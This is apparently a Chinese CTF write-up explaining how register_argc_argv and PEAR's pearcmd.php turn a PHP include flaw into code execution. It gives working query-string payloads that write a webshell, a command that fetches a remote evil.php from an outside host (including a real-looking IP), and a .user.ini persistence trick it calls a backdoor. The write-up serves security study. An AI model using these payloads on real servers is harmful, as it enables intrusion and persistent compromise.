---
title: register_argc_argv与include to RCE的巧妙组合
tags:
  - php
  - 文件包含
  - php配置
---

# register_argc_argv与include to RCE的巧妙组合
引子是巅峰极客2020的**Meow World**,题目总结下来只有一句话:

 ```php
 <?php
 include $_GET['f'].".php";
 ```


真的是开局一个include,getshell全靠猜,比赛时提示register_argc_argv,但没做出来,赛后看了别人的wp和总结,自己也打算写一个小结.

## register_argc_argv

首先了解到这个参数默认是On的:

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210605082433.png)


但是经过后来测试发现但凡配置了php.ini的php里都会显示声明该参数为Off,那么这个参数是用来做什么的呢?

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210605082507.png)

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210605082516.png)


这里介绍了register_argc_argv的作用,当这个参数开启的时候,php会注册argc和argv这个全局变量,并且通过第二个图可知我们可以从$_SERVER['argv'] 中获取到这些值.

这里就要知道php作为一种脚本语言,当然可以用于编写命令行脚本,而我们可以在脚本中直接访问 $argv ,$argc 这两个全局变量.

这里实际测试下载register_argc_argv开启的情况下$_SERVER['argv']与$argv的值:

 ```php
 <?php
 var_dump($_SERVER['argv']);
 var_Dump($argv);
 ```


网页端中:

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210605082551.png)


命令行模式下:

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210605082610.png)


而在register_argc_argv关闭的情况下,$_SERVER['argv']不会拿到任何取值

## pear

接下来就要介绍pear这个命令,简介如下:

### pear

Pear 是 PHP 扩展与应用库（the PHP Extension and Application Repository）的缩写，是一个 PHP 扩展及应用的一个代码仓库。Pear 仓库代码是以包（package）分区，每一个 `Pear package` 都是一个独立的项目有着自己独立的开发团队、版本控制、文档和其他包的依赖关系信息。Pear package 以 phar、tar 或 zip 发布。

既然是个包管理器,那么就应该存在下载和安装包的功能,那么pear命令是如何实现的呢?

实际上pear命令是sh脚本,源码如下:

 ```bash
 #!/bin/sh
 
 # first find which PHP binary to use
 if test "x$PHP_PEAR_PHP_BIN" != "x"; then
   PHP="$PHP_PEAR_PHP_BIN"
 else
   if test "/usr/local/bin/php" = '@'php_bin'@'; then
     PHP=php
   else
     PHP="/usr/local/bin/php"
   fi
 fi
 
 # then look for the right pear include dir
 if test "x$PHP_PEAR_INSTALL_DIR" != "x"; then
   INCDIR=$PHP_PEAR_INSTALL_DIR
   INCARG="-d include_path=$PHP_PEAR_INSTALL_DIR"
 else
   if test "/usr/local/lib/php" = '@'php_dir'@'; then
     INCDIR=`dirname $0`
     INCARG=""
   else
     INCDIR="/usr/local/lib/php"
     INCARG="-d include_path=/usr/local/lib/php"
   fi
 fi
 
 exec $PHP -C -q $INCARG -d date.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir="" -d safe_mode=0 -d register_argc_argv="On" -d auto_prepend_file="" -d auto_append_file="" $INCDIR/pearcmd.php "$@"
 ```


通过看最后一行可以知道其实它是通过php调用了pearcmd.php,那么pearcmd.php中$argv是从哪里来的呢,通过简单查找可以看到其调用了另一个php文件中某个类方法:

 ```php
 require_once 'Console/Getopt.php';
 /* ... */
 $argv = Console_Getopt::readPHPArgv();
 ```


再次跟进Console/Getopt.php,找到该方法的实现:

 ```php
 public static function readPHPArgv()
     {
         global $argv;
         if (!is_array($argv)) {
             if (!@is_array($_SERVER['argv'])) {
                 if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) {
                     $msg = "Could not read cmd args (register_argc_argv=Off?)";
                     return PEAR::raiseError("Console_Getopt: " . $msg);
                 }
                 return $GLOBALS['HTTP_SERVER_VARS']['argv'];
             }
             return $_SERVER['argv'];
         }
         return $argv;
     }
 ```


可以看到获取$argv的方式是`global $argv --> $_SERVER['argv'] --> $GLOBALS['HTTP_SERVER_VARS']['argv']`

同时我们知道当我们include一个可以被php解析的文件的时候,php代码会被自动执行,这样在register_argc_argv开启的情况下我们就有可能通过包含pearcmd.php与操控$_SERVER['argv']来执行pear命令

### pear命令任意文件下载

我们先来看看如何通过pear命令来实现任意文件下载:

1. 在目录下创建一个tmp.php
    ![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210605082631.png)
2. 使用python一句话开启http服务器:` python -m SimpleHTTPServer 8080`

3. 通过执行`pear`命令获取帮助,发现存在download选项,尝试执行`pear download http://127.0.0.1:8080/tmp.php`,可以看到已经成功在当前目录下载了tmp.php:
    ![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210605082702.png)
4. 有没有办法控制下载目录?答案是使用install -R而非download,尝试执行`pear install -R /var/www/html http://127.0.0.1:8080/tmp.php `

    ![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210605082751.png)


5. 成功下载到web目录下并能够访问
    ![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210605082843.png)


### 如何控制$_SERVER['argv']

如何往$_SERVER['argv']传入2个或以上的参数?测试一下:

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210605082904.png)


并不能通过&作为$_SERVER['argv']的分割,通过查阅资料和阅读源码:

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210605082919.png)

main/php_variables.c  

 ```c
 PHPAPI void php_build_argv(const char *s, zval *track_vars_array)
 {
 zval arr, argc, tmp;
 int count = 0;
 if (!(SG(request_info).argc || track_vars_array)) {
 return;
 }
 array_init(&arr);
 /* Prepare argv */
 if (SG(request_info).argc) { /* are we in cli sapi? */
 int i;
 for (i = 0; i < SG(request_info).argc; i++) {
 ZVAL_STRING(&tmp, SG(request_info).argv[i]);
 if (zend_hash_next_index_insert(Z_ARRVAL(arr), &tmp) == NULL) {
 zend_string_efree(Z_STR(tmp));
 }
 }
 } else if (s && *s) {
 while (1) {
 const char *space = strchr(s, '+');
 /* auto-type */
 ZVAL_STRINGL(&tmp, s, space ? space - s : strlen(s));
 count++;
 if (zend_hash_next_index_insert(Z_ARRVAL(arr), &tmp) == NULL) {
 zend_string_efree(Z_STR(tmp));
 }
 if (!space) {
 break;
 } s
 = space + 1;
 }
 }
 ```


可以知道argv通过query_string取值,并通过+作为分割符,尝试一下:

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210605082954.png)

## 回到题目

现在回到题目,我们所有的拼图已经凑齐了,假如存在以下环境:

- 安装了pear

- 开启了register_argc_argv

- 存在可控的`include $_GET['f']`(即使是`include $_GET['f'].php`)

那么我们就可以通过上面的知识实现任意文件下载从而getshell:

 ```
 //通过本地直接写入webshell,注意这里最好抓包然后用burpsuite或者直接curl执行，否则浏览器会将< ? > 转义
 // config-create可以直接创建配置文件，且第一个参数必须以/开头
 http://ip:port/include.php?f=pearcmd&+config-create+/<?=phpinfo();?>+/tmp/evil.php
 // 通过远程直接下载webshell
 // web目录可写
 - http://ip:port/include.php?f=pearcmd&+install+-R+/var/www/html+http://ip:port/evil.php
 - http://ip:port/tmp/pear/download/evil.php
 // tmp目录可写
 - http://ip:port/include.php?f=pearcmd&+install+-R+/tmp+http://ip:port/evil.php
 - http://ip:port/include.php?f=/tmp/pear/download/evil
 ```


&+install+-R+/tmp+http://162.14.65.110:8888/1.php

## 后门

前面提到register_argc_argv是PHP INI PERDIR的,所以我们可以通过新建一个.user.ini设置register_argc_argv为On用于留后门

## 最后:docker

在php官方提供的镜像下,默认是不使用php.ini的(在/usr/local/etc/php中存在php.ini-production和php.ini-development,需要手动修改任意一个文件名为php.ini才会启动php.ini,而上面我们提到在php.ini中register_argc_argv都设置为Off)

而register_argc_argv在不设置的情况下默认为On,那么假如有一个默认的docker-php环境,并存在可控的`include $_GET['f']`(即使是include $_GET['f'].php),我们就可以利用这个漏洞实现getshell

